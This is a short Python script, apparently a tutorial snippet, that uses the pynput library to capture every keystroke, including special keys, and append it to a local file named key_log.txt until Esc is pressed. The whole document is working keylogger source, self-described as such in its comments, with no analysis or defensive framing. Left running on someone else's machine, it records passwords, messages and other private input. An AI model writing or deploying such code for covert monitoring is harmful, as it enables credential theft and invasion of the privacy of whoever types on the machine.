


# pip install pynput


from pynput import keyboard


LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            # Writing the key pressed to the log file
            log.write(f"{key.char}")
    except AttributeError:
        # Special keys like Ctrl, Alt, etc.
        with open(LOG_FILE, "a") as log:
            log.write(f"[{key}]")

def on_release(key):
    # Stop the keylogger if 'Esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
